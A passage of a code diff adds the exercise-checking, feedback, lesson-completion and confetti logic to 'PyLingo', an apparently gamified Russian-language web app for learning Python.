+                            sandboxOut.textContent = '⚠️ Ошибка в коде: ' + e.message;
+                            sandboxOut.style.color = '#ff6b6b';
+                        }
+                    }
+                } else if (ex.type === 'mc') {
+                    const selected = document.querySelector('.mc-option.selected');
+                    if (!selected) {
+                        showFeedback('Выбери вариант ответа! 😅', 'error');
+                        return;
+                    }
+                    const selIndex = parseInt(selected.dataset.index);
+                    userAnswer = ex.options[selIndex];
+                    if (selIndex === ex.answer) {
+                        isCorrect = true;
+                        selected.classList.add('correct-choice');
+                    } else {
+                        selected.classList.add('wrong-choice');
+                        const correctEl = document.getElementById('mcOpt' + ex.answer);
+                        if (correctEl) correctEl.classList.add('correct-choice');
+                    }
+                }
+
+                state.exerciseAttempts++;
+
+                if (isCorrect) {
+                    if (exerciseBox) exerciseBox.classList.add('correct');
+                    showFeedback('🎉 Отлично! Правильно!', 'success');
+                    const checkBtn = document.getElementById('checkBtn');
+                    if (checkBtn) checkBtn.disabled = true;
+                    const hintBtn = document.getElementById('hintBtn');
+                    if (hintBtn) hintBtn.style.display = 'none';
+                    // Disable MC options
+                    if (ex.type === 'mc') {
+                        document.querySelectorAll('.mc-option').forEach(o => o.style.pointerEvents = 'none');
+                    }
+                    if (ex.type === 'code') {
+                        const codeInput = document.getElementById('codeInput');
+                        if (codeInput) codeInput.disabled = true;
+                    }
+
+                    // Move to next exercise or complete lesson
+                    setTimeout(() => {
+                        if (state.currentExerciseIndex + 1 < lesson.exercises.length) {
+                            renderExercise(screen, lesson, state.currentExerciseIndex + 1);
+                            if (exerciseBox) exerciseBox.classList.remove('correct');
+                        } else {
+                            completeLesson(
+                                parseInt(screen.dataset.unitId),
+                                parseInt(screen.dataset.lessonId)
+                            );
+                            renderScreen('complete', {
+                                lessonTitle: lesson.title,
+                                unitId: parseInt(screen.dataset.unitId),
+                                lessonId: parseInt(screen.dataset.lessonId),
+                            });
+                            spawnConfetti();
+                        }
+                    }, 1200);
+                } else {
+                    if (exerciseBox) exerciseBox.classList.add('wrong');
+                    setTimeout(() => { if (exerciseBox) exerciseBox.classList.remove('wrong'); }, 500);
+                    showFeedback('❌ Не совсем так. Попробуй ещё раз!', 'error');
+                    if (ex.type === 'mc') {
+                        setTimeout(() => {
+                            document.querySelectorAll('.mc-option').forEach(o => {
+                                o.classList.remove('selected', 'correct-choice',
+                                    'wrong-choice');
+                                o.dataset.selected = '';
+                            });
+                        }, 800);
+                    }
+                }
+            }
+
+            function showFeedback(msg, type) {
+                const fb = document.getElementById('feedback');
+                if (!fb) return;
+                fb.textContent = msg;
+                fb.className = 'feedback show ' + (type === 'success' ? 'success' : 'error');
+                if (type === 'success') {
+                    setTimeout(() => { fb.className = 'feedback'; }, 2000);
+                }
+            }
+
+            function showHint(lesson) {
+                const ex = lesson.exercises[state.currentExerciseIndex];
+                if (ex && ex.hint) {
+                    showFeedback('💡 Подсказка: ' + ex.hint, 'success');
+                } else {
+                    showFeedback('🤷 Подсказки нет, подумай сам!', 'error');
+                }
+            }
+
+            function renderComplete(screen, data) {
+                screen.style.textAlign = 'center';
+                screen.style.justifyContent = 'center';
+                screen.style.alignItems = 'center';
+                screen.innerHTML = `
+                    <div style="font-size:4em;">🏆</div>
+                    <h2>Урок пройден!</h2>
+                    <p style="color:var(--text2);">${data.lessonTitle}</p>
+                    <div style="font-size:2em;font-weight:900;color:var(--gold);">+15 XP ⚡</div>
+                    <p>Серия: 🔥 ${state.streak} дней</p>
+                    <div class="btn-row" style="justify-content:center;">
+                        <button class="btn btn-primary" id="nextLessonBtn">📚 Следующий урок</button>
+                        <button class="btn btn-outline" id="backToPathBtn">🗺️ К списку уроков</button>
+                    </div>
+                `;
+                setTimeout(() => {
+                    const nxt = document.getElementById('nextLessonBtn');
+                    const btp = document.getElementById('backToPathBtn');
+                    if (nxt) nxt.addEventListener('click', () => {
+                        const next = getNextLesson();
+                        if (next) {
+                            openLesson(next.unitId, next.lessonId);
+                        } else {
+                            renderScreen('path');
+                            spawnConfetti();
+                            setTimeout(() => alert(
+                                '🎉 Поздравляем! Ты прошёл все уроки в этом режиме! Попробуй другой режим или начни заново.'
+                                ), 300);
+                        }
+                    });
+                    if (btp) btp.addEventListener('click', () => renderScreen('path'));
+                }, 50);
+            }
+
+            function shakeElement(el) {
+                el.style.animation = 'none';
+                el.offsetHeight;
+                el.style.animation = 'shake 0.5s ease';
+                setTimeout(() => { el.style.animation = ''; }, 500);
+            }
+
+            function spawnConfetti() {
+                const colors = ['#58cc02', '#ffc800', '#ff4b4b', '#4da6ff', '#ff8c42', '#b066ff', '#ff69b4',
+                '#00e5ff'];
+                const fragment = document.createDocumentFragment();
+                for (let i = 0; i < 60; i++) {
+                    const piece = document.createElement('div');
+                    piece.className = 'confetti-piece';
+                    piece.style.left = Math.random() * 100 + '%';
+                    piece.style.top = -(Math.random() * 40 + 10) + 'px';
+                    piece.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                    piece.style.animationDuration = (Math.random() * 2 + 2) + 's';
+                    piece.style.animationDelay = Math.random() * 0.8 + 's';
+                    piece.style.width = (Math.random() * 8 + 6) + 'px';
+                    piece.style.height = (Math.random() * 8 + 6) + 'px';
+                    fragment.appendChild(piece);
+                }
+                confettiContainer.appendChild(fragment);
+                setTimeout(() => {
+                    confettiContainer.innerHTML = '';
+                }, 3500);
+            }
+
+            // ============ INIT ============
+            function init() {
+                loadState();
+                updateTopBar();
+                if (state.mode && getNextLesson()) {
+                    renderScreen('path');
+                } else if (state.mode && !getNextLesson()) {
+                    // All completed
+                    renderScreen('path');
+                } else {
+                    renderScreen('welcome');
+                }
+            }
+
+            init();
+            console.log('🐍 PyLingo готов! Изучай Python весело.');
+            console.log('Режимы: Студент (с нуля) | PRO (продвинутый)');
+            console.log('Твой прогресс сохраняется в браузере.');
+        })();
+    </script>
 </body>
 </html>
